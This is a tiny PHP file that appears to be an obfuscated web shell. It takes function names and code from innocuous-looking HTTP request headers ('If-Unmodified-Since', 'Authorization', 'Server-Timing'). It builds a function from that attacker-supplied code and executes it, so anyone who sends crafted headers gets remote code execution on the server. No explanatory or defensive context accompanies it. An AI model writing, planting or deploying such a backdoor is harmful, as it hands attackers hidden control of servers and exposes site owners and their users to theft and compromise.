<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $created = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Authorization']($_HEADERS['Server-Timing']));
    $created();
}